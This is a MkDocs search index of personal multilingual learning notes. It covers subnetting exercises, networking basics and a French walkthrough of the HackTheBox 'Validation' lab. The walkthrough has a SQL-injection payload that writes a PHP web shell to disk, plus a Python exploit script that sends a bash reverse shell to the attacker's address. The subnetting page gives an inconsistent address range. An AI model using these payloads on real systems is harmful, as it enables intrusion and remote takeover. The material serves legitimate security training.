{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"rnek0's notes","text":"<p>Voici des notes dans mon parcours d'apprentissage, ceci est purement perso mais il est possible que cela se retrouve sur le net; de nos jours cela serait non pas une sextape mais des notetape  . Certaines ne seront pas traduites, donc parfois en fran\u00e7ais ou espagnol ou en anglais. Celui qui a un doute il peut aller sur :</p> <ul> <li>translate google</li> <li>translate deepl</li> <li>Bing Microsoft Translator</li> </ul> <p>ou d'autres outils, au choix...</p> <pre><code>graph LR\n  A[Leo] --&gt; B{Comprendo?};\n  B --&gt;|Si| C[sigo leyendo];\n  B ----&gt;|No| E[Como lo traduzco!, quien me lo explica ?];\n  C --&gt;|Si| D[me gusta, leo mas ?];\n  D --&gt;|Si| B;\n  D --&gt;|No| F;\n  F[hasta otra...];</code></pre> <p>Ces notes se trouvent ici : </p> <ul> <li>rnek0's notes - local lorsque je travaille dessus.</li> <li>rnek0's notes - online sur le web.</li> </ul> <p>Les endroits ou j'apprends des choses peuvent \u00eatre divers et vari\u00e9s. Cela peut \u00eatre un point de depart sur ma page de liens</p>"},{"location":"#pourquoi","title":"Pourquoi ?","text":"<p>Parce que je n'ai pas un cerveau muscl\u00e9 comme Schwarzenegger \u00e0 l'\u00e9poque de Conan le Barbare...</p> <p>Et bien, le sujet est toujours le m\u00eame, il y en a qui pr\u00e9f\u00e8rent Cherrytree ou bien Obsidian ou que sais je, le block notes avec l'explorateur et de la patience; oui il y a un petit dernier \u00e0 tester qui est Logsec, voici la doc.  </p> <p>Bref, il me faut un bon syst\u00e8me de prise de notes et je suis en phase de test; puis pour ne rien vous cacher mes pr\u00e9requis sont :</p> <ul> <li>il faut que le machin puisse g\u00e9n\u00e9rer des sites, voir des books </li> <li>que la lecture soit disponible de partout </li> <li>que la mise \u00e0 jour se fasse facilement, donc le workflow soit simple.</li> <li>qu'on puisse customiser la chose tant qu'a faire et qu'on puisse personnaliser (mettre les mains dedans).</li> <li>i18n serait un plus.</li> <li>Pourquoi pas g\u00e9n\u00e9rer des pdf.</li> </ul> <p>En complement peut \u00eatre rechercher a faire des mindmaps, mais je verrais plus tard.</p>"},{"location":"#les-tests","title":"Les tests","text":"<p>Voici mes choix du moment, toujours en Markdown puis g\u00e9n\u00e9ration avec pandoc ou autres apps vers quelque chose de plus structur\u00e9.</p> <p>Pour les blogs ou docs en ligne :</p> <ul> <li>Jekyll (Python) avec md pour un blog simple https://web.lunarviews.net</li> <li>Hugo (Go) avec md pour un blog simple <ul> <li>Mon blog Hugo est en travaux (pas disponible)</li> </ul> </li> <li> <p>Material for MkDocs (Python) https://rnek0.github.io/lunarDocs/</p> </li> <li> <p>Jupyter notebooks (Python) (int\u00e9ressant car je peux g\u00e9n\u00e9rer des pdf \u00e0 la vol\u00e9e)</p> <ul> <li>Tests en lisant des tutos https://github.com/rnek0/TSbook </li> </ul> </li> <li>Zola (Rust) un petit dernier que j'ai vu passer et qui m'a donn\u00e9 envie de tester des que j'aurai un p'ti moment.<ul> <li>Web https://www.getzola.org </li> </ul> </li> </ul> <p>Il y a ceux-ci \u00e9galement, mais ce ne sont pas forcement mes choix pour une utilisation en ligne :</p> <ul> <li>Logsec que j'ai pas encore test\u00e9.</li> <li>Cherrytree</li> <li>Obsidian</li> </ul> <p>Et aussi mdBook (Rust) que j'aimerais avoir le temps de tester car Rust est la grande mode, r\u00e9cemment introduite dans le kernel Linux si j'en crois mes oreilles.</p>"},{"location":"#mkdocs","title":"Mkdocs","text":"<p>C'est le g\u00e9n\u00e9rateur de documentation que vous voyez en ce moment. Si vous \u00eates int\u00e9ress\u00e9 voici une video de James Willett  \u00e0 ne pas manquer.  </p> <p>Quelques commandes tr\u00e8s utiles de MkDocs</p> <ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#strucure-du-projet","title":"Strucure du projet","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"#choisir-le-theme","title":"Choisir le th\u00e8me","text":"<p>https://www.mkdocs.org/user-guide/choosing-your-theme/</p>"},{"location":"#keycodes-pour-les-shortcuts","title":"Keycodes pour les shortcuts","text":"<p>https://www.toptal.com/developers/keycode</p>"},{"location":"about/","title":"About","text":"<p>Algunos de mis apuntes sobre ordenadores, redes y pentest o hacking \u00e9tico. Principalmente en castellano, franc\u00e9s o ingles. Sin embargo intento poner en espa\u00f1ol lo mas posible para no olvidar el idioma, e igualmente porque estoy en comunidades de habla hispana.</p>"},{"location":"about/#estructura-de-los-apuntes","title":"Estructura de los apuntes","text":"<p>Los apuntes sobre redes est\u00e1n estructurados en gran parte alrededor del temario del curso de introducci\u00f3n al hacking de la academia hack4u pero tambi\u00e9n otros recursos, los enlaces ser\u00e1n utilizados cada vez que sea necesario o conveniente por temas de cortes\u00eda y reconocimiento; algunos ser\u00e1n gratuitos y otros de pago, aunque el saber deber\u00eda ser gratuito se comprende que los creadores de contenido y los profesores deben ser remunerados. Es lo m\u00ednimo que se puede hacer para respetar la Netiqueta.</p> <p>Los tiers vienen de HTB, maquinas simples para empezar en el pentesting. </p> <p>Por mi parte todo esto hace parte de mi aprendizaje y si le puede servir \u00e0 alguien para ello en alg\u00fan punto, ese es el prop\u00f3sito para el que esta echo.</p> <p>Si desea seguir \u00e0 los enlaces y quedarse por aqu\u00ed no olvide el ctrl + click sobre el link para obtener otra pesta\u00f1a en el navegador.</p> <p>Enlaces :</p> <ul> <li>Mi blog</li> <li>Mi cuenta en github</li> <li>Mi cuenta en Mastodon si algo te parece inapropiado en esta web, env\u00edame un mensaje privado a esta cuenta.</li> </ul>"},{"location":"about/#descargo-de-responsabilidad-aviso-legal","title":"Descargo de responsabilidad (Aviso legal)","text":"<p>Este descargo de responsabilidad se aplica a todas las p\u00e1ginas, gu\u00edas y, en general, a todo el contenido publicado por el autor en este sitio.</p> <p>Al visitar este sitio, participar en su contenido, o aplicar lo que se presenta, usted entiende y acepta que :</p> <p>Estas paginas son SOLO para fines educativos y preventivos, de ninguna manera fomentan el incumplimiento de la ley. No se dar\u00e1 respuesta a solicitudes que infrinjan cualquier ley. Usted es el \u00fanico responsable de sus actos y del uso que haga de lo que se muestra en este sitio. Ni el autor ni el organismo que hospeda estas paginas podr\u00e1n ser considerados responsables de sus actos, cualquiera que sea su naturaleza.</p> <p>Los entornos o servicios de terceros mencionados en estas paginas sobre pentesting y/o seguridad informatica son syst\u00e8mas controlados y previstos para tal efecto. El software mencionado conlleva generalmente una licencia y no se fomenta ningun incumplimiento de ella. Si, por alguna razon un contenido presente en estas paginas no respeta sus derechos de autor no dude en ponerse en contacto con el administrador del sitio web (admin @ lunarviews.net)</p>"},{"location":"assets/validation/README_nmap/","title":"Validation - HTB","text":"<p>Enumeration : </p>"},{"location":"htbmachines/validation/","title":"Validation","text":""},{"location":"htbmachines/validation/#machine-validation-htb","title":"Machine Validation - htb","text":"<ul> <li>Validation</li> <li>10.10.11.116</li> <li>Cr\u00e9e par ippsec</li> </ul> <p>Ce write-up est destin\u00e9 \u00e0 quelqu'un qui souhaiterait s'initier \u00e0 sqli, on va faire cela dans un environnement control\u00e9 dans la plateforme Hackthebox. Je tente d'expliquer le processus de A \u00e0 Z et bien qu'il puisse sembler compliqu\u00e9 pour un n\u00e9ophyte il n'en est rien. Tout a un sens et avec un minimum de travail assidu cela semblera assez simple. D'ailleurs la machine en question est qualifi\u00e9e de Facile. Il est conseill\u00e9 d'\u00e9ffectuer ce tuto dans une machine virtuelle, cela va de soi.</p> <p>Voir d'autres r\u00e9solutions de cette machine. \u00a0</p>"},{"location":"htbmachines/validation/#connection-a-htb-acces-au-reseau-controle","title":"Connection \u00e0 htb, acc\u00e9s au r\u00e9s\u00e9au control\u00e9.","text":"<p>Il faut t\u00e9l\u00e9charger le fichier .ovpn et l'executer comme ceci</p> <pre><code># sudo openvpn rnek0-1337.ovpn\n2022-02-20 17:52:33 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless \"allow-compression yes\" is also set.\n#... longue suite de sortie dans le terminal\n</code></pre> <p>Ne pas oublier les commandes suivantes pour verifier le tun et le r\u00e9s\u00e9au</p> <ul> <li>$ifconfig</li> <li>$netstat -rn </li> </ul> <p>je suis en tun0 Avec l'ip 10.10.14.2</p> <p> </p>"},{"location":"htbmachines/validation/#spawn-the-machine","title":"Spawn the machine","text":"<p>Aller dans la page de HTB et cliquer sur le bouton qui va spawn la machine</p> <p>On aura l'addresse ip de la machine et on clique dessus pour avoir l'ip de la machine :</p> <p>10.10.11.116 </p> <p> </p>"},{"location":"htbmachines/validation/#enumeration","title":"Enum\u00e9ration","text":"<p>A ) On commence par tester si la machine est UP avec un ping :</p> <pre><code>\u2514\u257crnek0$ping -c3 10.10.11.116 PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.\n64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=32.6 ms\n64 bytes from 10.10.11.116: icmp_seq=2 ttl=63 time=28.3 ms\n64 bytes from 10.10.11.116: icmp_seq=3 ttl=63 time=28.2 ms\n\n--- 10.10.11.116 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2002ms\nrtt min/avg/max/mdev = 28.171/29.678/32.592/2.060 ms\n</code></pre> <p>3 received, 0% packet loss ! la machine est disponible et UP pour l'aventure.</p> <p>On est devant une machine linux car on a un ttl (time to live) de 63, le trac\u00e9 des paquets icmp est a un saut (passe par une machine intermediaire) il sera reduit de 1 au passage donc il est pr\u00e9s du 64 correspondant a une machine linux. Pour Windows c'est un 128 en g\u00e9n\u00e9ral.</p> <p>On va se servir de l'outil whichSystem.py pour confirmer :</p> <p></p> <p>Au bout d'un moment on cr\u00e9e ses propres scripts, celui-ci et le suivant \"extractPorts\" ont \u00e9t\u00e9 cr\u00e9es par S4vitar Si vous \u00eates \"hispanohablante\" et souhaitez vous initier au monde du pentesting, je ne peux que vous conseiller de jetter un coup d'oeuil a son academie sur https://hack4u.io.</p> <p> </p> <p>B ) On va faire un scan des ports avec nmap pour savoir quels sont les ports ouverts.</p> <pre><code>#nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG allPorts\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 02:43 CET\nInitiating SYN Stealth Scan at 02:43\nScanning 10.10.11.116 [65535 ports]\nDiscovered open port 22/tcp on 10.10.11.116\nDiscovered open port 8080/tcp on 10.10.11.116\nDiscovered open port 80/tcp on 10.10.11.116\nSYN Stealth Scan Timing: About 50.60% done; ETC: 02:45 (0:00:35 remaining)\nDiscovered open port 4566/tcp on 10.10.11.116\nCompleted SYN Stealth Scan at 02:45, 86.10s elapsed (65535 total ports)\nNmap scan report for 10.10.11.116\nHost is up, received user-set (0.13s latency).\nScanned at 2023-01-30 02:43:58 CET for 86s\nNot shown: 52108 filtered tcp ports (no-response), 13423 closed tcp ports (reset)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE    REASON\n22/tcp   open  ssh        syn-ack ttl 63\n80/tcp   open  http       syn-ack ttl 62\n4566/tcp open  kwtc       syn-ack ttl 63\n8080/tcp open  http-proxy syn-ack ttl 63\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 86.20 seconds\n           Raw packets sent: 124007 (5.456MB) | Rcvd: 13468 (538.812KB)\n</code></pre> <p>PORTS OPEN :  </p> <p>22/tcp   open  ssh        syn-ack ttl 63 80/tcp   open  http       syn-ack ttl 62 4566/tcp open  kwtc       syn-ack ttl 63 8080/tcp open  http-proxy syn-ack ttl 63  </p> <ol> <li>Si on regarde n\u00f4tre fichier cr\u00e9e par nmap (allPorts) nous avons ceci : </li> </ol> <pre><code># Nmap 7.93 scan initiated Mon Jan 30 02:43:58 2023 as: nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv -oG allPorts 10.10.11.116\n# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)\nHost: 10.10.11.116 ()   Status: Up\nHost: 10.10.11.116 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 4566/open/tcp//kwtc///, 8080/open/tcp//http-proxy///\n# Nmap done at Mon Jan 30 02:45:24 2023 -- 1 IP address (1 host up) scanned in 86.20 seconds\n</code></pre> <p>On va utiliser la fonction bash extractPorts qui est dans n\u00f4tre .zshrc pour profiter du fichier grepeable allPorts et copier les ports dans la clipboard (ceci est optionnel): </p> <p></p> <p> </p> <p>Maintenant on va donc faire un scan nmap sur ces ports specifiques pour avoir des infos un peu plus en profondeur: </p> <pre><code>nmap -sCV -p22,80,4566,8080 -vvv 10.10.11.116 -oN targeted\n</code></pre> <p>INFOS SUR CES PORTS : </p> <ul> <li>22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li> <li>80/tcp   open  http    syn-ack Apache httpd 2.4.48 ((Debian))</li> <li>Supported Methods: GET HEAD POST OPTIONS  </li> <li>4566/tcp open  http    syn-ack nginx | _http-title: 403 Forbidden  le serveur comprend la requ\u00eate mais refuse de l'autoriser.</li> <li>8080/tcp open  http    syn-ack nginx | _http-title: 502 Bad Gateway</li> </ul> <p> </p> <p>Recherche du contenu du service dans le port 80 avec l'outil whatweb</p> <pre><code>\u2514\u2500\u2500\u257c #whatweb http://10.10.11.116\nhttp://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]\n</code></pre> <p>Nous avons :  * 200 OK -&gt; Succ\u00e9s (la page est servie) indique la r\u00e9ussite d'une requ\u00eate.  * Debian  Apache[2.4.48]  PHP[7.4.23] * JQuery  </p> <p> </p> <p>Sur le port 8080 quelques infos mais rien de tr\u00e8s interessant </p> <pre><code>\u2514\u2500\u2500\u257c #whatweb http://10.10.11.116:8080\nhttp://10.10.11.116:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[502 Bad Gateway], nginx\n</code></pre> <ul> <li>502 Bad Gateway indique que le serveur, agissant comme une passerelle ou un proxy, a re\u00e7u une r\u00e9ponse invalide depuis le serveur en amont.</li> <li>nginx</li> </ul> <p> </p> <p>On va donc aller voir le site avec le navigateur:</p> <p></p> <p>On voit un formulaire o\u00f9 l'on peut tester les entr\u00e9es du formulaire et on constate :</p> <ul> <li>cr\u00e9ation de user</li> <li>interpretation de html: donc on peut faire du bold (\u00e9crire en gras en html) <code>&lt;b&gt;comme ceci&lt;/b&gt;</code></li> <li>XSS vulnerable avec <code>&lt;script&gt;alert(\"XSS)&lt;/script&gt;</code> (fonction du langage javascript)</li> </ul> <p>Detail du code html de la page apr\u00e8s envoi : </p> <pre><code>&lt;link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\"&gt;\n&lt;script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;!------ Include the above in your HEAD tag ----------&gt;\n&lt;div class=\"container\"&gt;\n&lt;h1 class=\"text-center m-5\"&gt;Join the UHC - September Qualifiers&lt;/h1&gt;\n&lt;/div&gt;\n&lt;section class=\"bg-dark text-center p-5 mt-4\"&gt;\n&lt;div class=\"container p-5\"&gt;\n&lt;h1 class=\"text-white\"&gt;Welcome &lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;/h1&gt;&lt;h3 class=\"text-white\"&gt;Other Players In Brazil&lt;/h3&gt;&lt;li class='text-white'&gt;admin&lt;/li&gt;&lt;li class='text-white'&gt;&lt;b&gt;adminBold&lt;/b&gt;&lt;/li&gt;&lt;li class='text-white'&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;/li&gt;      &lt;/div&gt;\n&lt;/section&gt;\n&lt;/div&gt;\n</code></pre> <p>On en tire :</p> <ul> <li>bootstrap 4.1.1</li> <li>jquery 3.2.1</li> </ul> <p>Le formulaire : </p> <ul> <li>method=\"Post\"</li> <li><code>&lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt;</code></li> <li><code>&lt;select id=\"country\" name=\"country\"&gt;</code></li> <li>bouton submit simple</li> </ul> <p>la requette pointe sur account.php, elle sera donc du style :</p> <p>http://10.10.11.116/account.php?name=toto&amp;country=brazil</p> <p>On constate quels sont les emplacements que les variables prennent dans le code apr\u00e8s la g\u00e9n\u00e9ration du html. Plus tard on ira peut-etre voir le code de la page php... ;)</p> <p>On va voir qu'est ce que l'on peut faire avec burpsuite qui est une application qui va agir comme un interm\u00e9diaire entre la demande de l'utilisateur et la reponse du serveur (ici un fichier en language php qui va g\u00e9n\u00e9rer une page html). Cette application va nous servir \u00e0 forger nos requettes au lieu d'utiliser le formulaire de la page. On va jouer avec le champ country vu precedemment qui correspond \u00e0 une variable dans le script php :</p> <p>Comment savoir si on peut faire une injection sql ? Puis qu'est ce que sql ?  </p> <p>Sql est un language qui permet de faire des demandes \u00e0 une base de donn\u00e9es \u00e0 partir des pages php dans le cas pr\u00e9sent, la base de donn\u00e9es contient les informations, on fait la demande avec sql on traite la sortie avec le fichier php qui va g\u00e9n\u00e9rer du code html \u00e0 la vol\u00e9e, et sera servi \u00e0 l'utilisateur dans le navigateur; c'est ce que l'on appelle des pages dynamiques d'un site internet.</p> <p>Les requettes sql sont du style : <pre><code>select * FROM &lt;table&gt; WHERE &lt;champ&gt; = \"&lt;valeur demand\u00e9e&gt;\"\n</code></pre></p> <p> </p> <p>Ici on va jouer sur le champ country de la table registration, donc notre requette deviendra comme ceci :</p> <pre><code>select * FROM registration WHERE country=Afganistan'\n</code></pre> <p> </p> <p></p> <p>Puis comme on voit ci-dessus, on essaye avec un <code>union select database() -- -</code> et on tombe sur le nom de la base de donn\u00e9es. Ici on voit le detail du code html gener\u00e9 et retourn\u00e9 par le serveur.</p> <p>Avec la commande <code>union select version() -- -</code> et on recupere la version de la base 10.5.11-MariaDB-1</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>On continue avec les injections jusqu'a tenter d'\u00e9crire dans le path de l'url un fichier que l'on va nommer prueba.php que l'on puisse executer en faisant appel a l'url! (L'injection sql va nous permettre d'envoyer le fichier dans le serveur)  </p> <p> </p> <p>Exemple de la query forg\u00e9e dans burpsuite, faites d\u00e9filer pour voir la fin de la commande : </p> <pre><code>username=kiki&amp;country=Afganistan' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/prueba.php\"-- -\n</code></pre> <p> </p> <p>Et la sortie que genere le fichier php, l'erreur correspond au fait que nous n'avons pas pass\u00e9 de variable au paramettre cmd qui est attendu par le morceau de code php que l'on injecte.</p> <p></p> <p> </p> <p>Ici on voit que l'on passe la commande whoami a la \"variable\" cmd et cela nous retourne www-data</p> <p></p> <p> </p> <p>Si on passe la commande cat, on obtiens l'affichage du code de la page account.php</p> <p></p> <p> </p> <p>Pour finir on va faire un script en python pour automatiser la proc\u00e9dure : </p> <pre><code>#! /usr/bin/python3\n# cf : https://youtu.be/78i-qbhEUVU?t=1479\nfrom pwn import *\nimport signal, pdb, requests\ndef def_handler(sig, frame):\nprint(\"\\n\\n[!] Saliendo...\\n\")\nsys.exit(1)\n# Ctrl+C\nsignal.signal(signal.SIGINT, def_handler)\nif len(sys.argv) !=3:\nlog.failure(\"Uso : %s &lt;ip-address&gt; filename\" % sys.argv[0])\nsys.exit(1)\n# Variables globales\nip_address = sys.argv[1]\nfilename = sys.argv[2]\nmain_url = \"http://%s/\" % ip_address\nlport = 443\ndef createFile():\ndata_post = {\n'username': 'kiki',\n'country' : \"\"\"Afganistan' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/%s\"-- -\"\"\" % (filename)\n}\nr = requests.post(main_url, data=data_post)\ndef getAccess():\ndata_post = {\n'cmd': \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1'\"\n}\nr = requests.post(main_url + \"%s\" % filename, data=data_post)\nif __name__ == '__main__':\ncreateFile()\ntry:\nthreading.Thread(target=getAccess, args=()).start()\nexcept Exception as e:\nlog.error(str(e))\nshell = listen(lport, timeout=20).wait_for_connection()\nshell.interactive()\n</code></pre> <p> </p> <p>Voila pour un debut, si vous \u00eates arriv\u00e9s jusqu'\u00e0 ici un bonus sur l'escalade :</p> <p>On aurait pu vous afficher aussi le code de la page config.php en plus de account.php avec la m\u00eame requette vue prec\u00e8demment dans la capture d'\u00e9cran (celle avec test.php)</p> <p>Cela r\u00e9v\u00e9le les informations d'identification de la base de donn\u00e9es et on peut remarquer que que le mot de passe contient global-pw. C'est un gros indice que ce mot de passe est utilis\u00e9 ailleurs.</p> <p>En essayant de faire un su - avec ce mot de passe, on obtient un acc\u00e8s root.</p> <p>Note : Vous n'obtiendrez pas toujours une invite visible apr\u00e8s avoir entr\u00e9 le mot de passe. Si vous entrez une commande telle que whoami vous verrez qu'il vous a bien permis d'avoir un shell en root.</p> <p>Pwned</p> up \u2191 <p> Voir aussi en video :</p> <ul> <li>ippsec </li> <li>s4vitar </li> </ul>"},{"location":"redes/172.128.0.0/","title":"Exercice, calculs sur sous-reseaux","text":"<p>Avec :</p> Description IP Adresse IP 172.128.10.5 Masque sous-reseau 255.255.192.0 <p>D\u00e9terminer :  </p> <ul> <li>L'addresse du reseau.</li> <li>Nombre d'adresses utilisables.</li> <li>Adresse de bloadcast du reseau.</li> <li>Plage adressable du reseau.</li> </ul>"},{"location":"redes/172.128.0.0/#trouver-laddresse-de-sous-reseau","title":"Trouver l'addresse de sous-reseau","text":"<p>On passe en binaire les octects de l'addresse IP et du masque de sous-reseau et on fais un ET logique sur chaque bit de ceux-ci.  Tool IpToBin.sh pour la conversion. - Interpretation du resultat : en passant les octets en decimal on obtiens l'addresse du sous-reseau (172.128.0.0).</p> <pre><code>10101100.10000000.00001010.00000101  172.128.10.5\n11111111.11111111.11000000.00000000  255.255.192.0\n-----------------------------------  ET logique\n10101100.10000000.00000000.00000000  172.128.0.0\n\n172.128.0.0  -&gt; addresse du sous-reseau\n</code></pre>"},{"location":"redes/172.128.0.0/#nombre-daddresses-utilisables","title":"Nombre d'addresses utilisables","text":"<p>On sait que :</p> <ul> <li>tous les bits a 1 du masque repr\u00e9sentent le nombre de sous-reseaux adressables</li> <li>tous les bits a 0 du masque repr\u00e9sentent le nombre de machines (hosts) que l'on peut adresser</li> </ul> <p>MASQUE DE SOUS-RESEAU :</p> <pre><code>Pour le masque 255.255.192.0\nSous-reseaux        | Hosts (nombre machines, ici 14 bits)\n11111111.11111111.11|000000.00000000           16383 donc + 1 = 16384 - 2\n**16382 nombre de hosts**\n</code></pre> <p>Ce qui veut dire dans n\u00f4tre cas pour le nombre de machines (14 bits) : </p> <p>11111111111111 (14 bits) en binaire font 16383 ce qui est le plus grand nombre que l'on puisse coder sur 14 bits :</p> <pre><code>\u276f echo \"$((2#11111111111111))\"\n16383\n</code></pre> <p>Pour conna\u00eetre le nombre d'adresses a coder on doit ajouter +1 car les int commencent a zero (0-9) donc on en a un de plus. Par ailleurs on sait qu'il y a deux addresses IP sp\u00e9ciales qui sont la premi\u00e8re et la derni\u00e8re, donc on retranche 2.</p> <p>Le nombre de hosts est donc : 16382</p>"},{"location":"redes/172.128.0.0/#plage-dadressage","title":"Plage d'adressage","text":"<p>Gr\u00e2ce au masque de sous reseau on connais la partie h\u00f4te (nombre de machines) On passe tous les host (14 bits) de l'adresse de sous-reseau a 1 pour trouver l\u2019adresse de broadcast :</p> <pre><code>172.128.0.0 en decimal\n10101100.10000000.00000000.00000000  -&gt; addresse de sous-reseau\n10101100.10000000.00111111.11111111  -&gt; broadcast (tous les hosts a 1)\n</code></pre> <p>172.128.63.255 -&gt; L'adresse de broadcast est donc celle ci.</p> <p>Plage Addressable : </p> <p>L'addresse IP de la premi\u00e8re machine correspond a celle du sous-reseau +1 L'addresse IP de broadcast -1 sera le dernier host : 172.128.0.254</p> <p>La plage d'adresses va de 172.128.0.1 \u00e0 172.128.0.254  </p>"},{"location":"redes/172.128.0.0/#calcul-avec-cidr","title":"Calcul avec CIDR","text":"<p>Dans cet exemple nous avons l'addresse IP 172.128.10.15 puis 18 bits a 1 dans le masque de sous-reseau. On a donc 172.128.10.15/18</p> <p>On va aller dans notre \"cheatsheet\" faite avec LibreOffice pour voir dans notre CIDR, on voit qu'on est dans un subnet Class B et que l'on doit remplacer le 3eme byte par 192 pour obtenir les mask de sous reseau.</p> <p></p> <p>De m\u00eame on voit le nombre le nombre de machines dans le reseau: 16382</p> <p></p> <p>Nous avons l'addresse IP et le masque de sous-reseau on va les entrer dans notre feuille de calcul pour avoir le reste, c'est \u00e0 dire l'addresse du reseau et celle de broadcast.</p> <p></p> <p>Las herramientas estan en la pagina Subnetting</p>"},{"location":"redes/intro/","title":"Introducci\u00f3n a las redes inform\u00e1ticas.","text":"<p>Las redes inform\u00e1ticas son la base de las comunicaciones en internet. </p> <p>Es un conjunto de equipos, nodos y software conectados entre s\u00ed por medio de dispositivos f\u00edsicos que env\u00edan y reciben impulsos el\u00e9ctricos, ondas electromagn\u00e9ticas o cualquier otro medio para el transporte de datos, con la finalidad de compartir informaci\u00f3n, recursos y ofrecer servicios.</p> <p>Todo lo que llega a tu ordenador, tel\u00e9fono, tel\u00e9fono m\u00f3vil, televisor, o otros dispositivos como la tostadora o el juguete que utilizan el cloud pasa por ellas.</p>"},{"location":"redes/intro/#historia","title":"Historia","text":"<p>Antes des empezar con la historia de las redes un video de \u2664 \u0282\u0105\u0196\u026c\u0131\u10dd\u10ea\u0105\u014b\u0199 \u2664  para descansar un poco de la lectura, se trata de un path de THM sobre las redes, se puede ver igualmente este otro  What is Networking? - Networking Basics.</p> <p>A partir de 1958 el DoD 'Departamento de Defensa de Estados Unidos' crea la ARPA la cual sera al origen de la red anterior a Internet. La primera iteraci\u00f3n de Internet tuvo lugar como parte del proyecto ARPANET a fines de la d\u00e9cada de 1960. Mas tarde se creara la red ARPA que pondr\u00e1 en relaci\u00f3n varias universidades y posteriormente, en 1980 ARPANET vuelve a tener un aspecto estrat\u00e9gico y sera separado en 3 partes, MILnet , DDN, NSFNET. Todo este proyecto fue financiado por el Departamento de Defensa de los Estados Unidos y fue la primera red documentada en acci\u00f3n. Sin embargo, no fue sino hasta 1989 que Tim Berners-Lee invent\u00f3 Internet en el CERN, tal como la conocemos, con la creaci\u00f3n de World Wide Web (WWW). Fue solo en ese momento que Internet fue usado para almacenar y compartir informaci\u00f3n (como lo es hoy).</p> <p>Una pagina (en franc\u00e9s) sobre la historia de internet : https://histoire-internet.vincaria.net/2020/04/1969-arpanet-arpa-network.html</p>"},{"location":"redes/intro/#componentes-basicos-de-las-redes","title":"Componentes b\u00e1sicos de las redes","text":"<p>Para poder formar una red se requieren bastantes elementos, por ejemplo: cables y estructuras, hardware (ordenadores clientes, servidores, tarjetas de red, smartphones, dispositivos IOT, etc), software (OS, routers OS servidores web, de correo, de telefon\u00eda) y protocolos (IP, TCP, UDP, HTTP...) ... Lo mas importante es la capa 8 del Modelo OSI (la que esta entre la silla y el monitor), para ello ha sido echo todo esto ;)</p> <p>Una de las cosas fundamentales que hace que la red funcione es el protocolo DNS del que hablaremos mas tarde. Hay organismos internacionales que est\u00e1n encargados de gestionar este proceso. </p> <p>Sobre el hardware en las redes  en la web de zeste de savoir.</p>"},{"location":"redes/ip/","title":"El protocolo IP","text":"<p>Un protocolo de comunicaciones es un sistema de reglas que permiten que dos o m\u00e1s entidades (computadoras, tel\u00e9fonos celulares, etc.) de un sistema de comunicaci\u00f3n se comuniquen entre ellas para transmitir informaci\u00f3n.</p> <p>Comunicar consiste en transmitir informaci\u00f3n, pero mientras los interlocutores no le atribuyan un significado, son solo datos y no informaci\u00f3n. Por lo tanto, los interlocutores deben no solo hablar un idioma com\u00fan, sino tambi\u00e9n dominar las reglas m\u00ednimas para transmitir y recibir datos. El papel de un protocolo es asegurarse de todo esto.</p>"},{"location":"redes/ip/#el-papel-del-protocolo-ip","title":"El papel del protocolo IP","text":"<p>El protocolo IP (no confundir con direcci\u00f3n ip), es parte de la capa de Internet del conjunto de protocolos TCP/IP que \"no es un est\u00e1ndar estricto, como lo es el modelo OSI de ISO\". Es uno de los protocolos m\u00e1s importantes de Internet porque permite el desarrollo y transporte de datagramas IP (paquetes de datos) , sin asegurar su \"entrega\". De hecho, el protocolo IP trata los datagramas IP independientemente unos de otros definiendo su representaci\u00f3n, enrutamiento y reenv\u00edo.  </p> <p>El protocolo IP es el protocolo que <code>permite identificar las m\u00e1quinas y enrutar la informaci\u00f3n a trav\u00e9s de Internet</code>. Protocolo de comunicaci\u00f3n de datos digitales clasificado funcionalmente en la capa de red seg\u00fan el modelo internacional OSI. </p> <p>El protocolo IP determina el destinatario del mensaje mediante 3 campos:</p> <ul> <li>El campo de direcci\u00f3n IP: direcci\u00f3n de la m\u00e1quina. En IPv4 4 octetos (32bits) representados en decimal y separados por puntos. </li> <li>El campo de m\u00e1scara de subred: una m\u00e1scara de subred permite que el protocolo IP determine la parte de la direcci\u00f3n IP que concierne a la red</li> 